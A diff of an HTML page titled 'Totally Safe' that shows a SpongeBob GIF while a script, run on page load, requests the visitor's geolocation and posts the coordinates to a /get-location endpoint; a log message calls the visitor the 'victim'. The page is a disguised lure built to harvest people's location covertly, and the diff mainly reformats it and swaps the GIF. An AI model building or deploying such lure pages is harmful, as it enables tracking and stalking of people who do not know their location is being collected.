@@ -1,47 +1,49 @@
 <!DOCTYPE html>
 <html>
+
 <head>
   <title>Totally Safe</title>
 </head>
+
 <body onload="getLocation()">
 
-<iframe src="https://giphy.com/embed/lTQF0ODLLjhza" width="480" height="355" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-<p><a href="https://giphy.com/gifs/kiss-spongebob-squarepants-lTQF0ODLLjhza">via GIPHY</a></p>
+  <iframe src="https://giphy.com/embed/Lz9CTF7m9lr8Y" width="480" height="221" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+  <p><a href="https://giphy.com/gifs/spongebob-squarepants-funny-dancing-Lz9CTF7m9lr8Y">via GIPHY</a></p>
 
-<script>
-  function getLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(showPosition);
-    } else {
-      console.log("Geolocation is not supported by victim's browser.");
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+     } else {
+       console.log("Geolocation is not supported by victim's browser.");
+     }
     }
-  }
 
-  function showPosition(position) {
+    function showPosition(position) {
 
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
   
-    const data = {
-      latitude: latitude,
-      longitude: longitude,
-    };
+      const data = {
+        latitude: latitude,
+        longitude: longitude,
+      };
 
-    fetch("/get-location", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(data),
-    })
-      .then((response) => response.text())
-      .then((message) => {
-        console.log(message);
+      fetch("/get-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
       })
-      .catch((err) => {
-        console.error("Error:", err);
-      });
-  }
+        .then((response) => response.text())
+        .then((message) => {
+          console.log(message);
+        })
+        .catch((err) => {
+          console.error("Error:", err);
+        });
+    }
 </script>
 
 </body>
